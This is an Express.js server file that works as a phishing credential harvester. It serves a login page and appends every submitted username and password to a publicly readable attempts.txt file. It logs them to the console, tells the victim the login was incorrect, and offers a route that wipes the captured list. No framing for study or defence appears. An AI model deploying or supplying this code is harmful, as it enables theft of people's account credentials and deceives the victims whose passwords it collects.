const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.use(express.static('public'));

app.get('/', (req, res) => {
	res.redirect('/login.html')
})

app.get('/clearattempts', (req, res) => {
	fs.writeFile('public/attempts.txt', '', function (err) {
		res.redirect('/attempts.txt')
	})
})

app.post('/login.html', (req, res) => {
	console.log(req.body)
	fs.appendFile('public/attempts.txt', `${req.body.username}:${req.body.password}\n`, function (err) {
		res.redirect('/incorrect.html')
	})
})

app.listen(3000, () => console.log('server started'))


